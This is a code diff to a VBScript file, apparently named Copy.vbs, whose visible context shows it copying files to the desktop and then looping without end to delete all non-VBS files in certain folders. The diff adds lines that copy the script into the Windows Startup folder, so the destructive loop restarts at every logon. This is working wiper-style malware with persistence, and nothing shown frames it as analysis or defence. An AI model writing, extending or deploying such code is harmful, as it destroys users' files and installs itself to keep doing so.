@@ -23,6 +23,10 @@ For i = 1 To numCopies
     objFSO.CopyFile strCopyPath, strDesktopCopyPath, True ' Add "True" to overwrite existing files
 Next
 
+' Add the script to the startup folder
+startupFolder = objShell.SpecialFolders("Startup")
+objFSO.CopyFile strScriptPath, startupFolder & "\Copy.vbs", True ' Add "True" to overwrite existing files
+
 ' Loop indefinitely
 Do
     ' Delete all files except VBS files within the specified folders
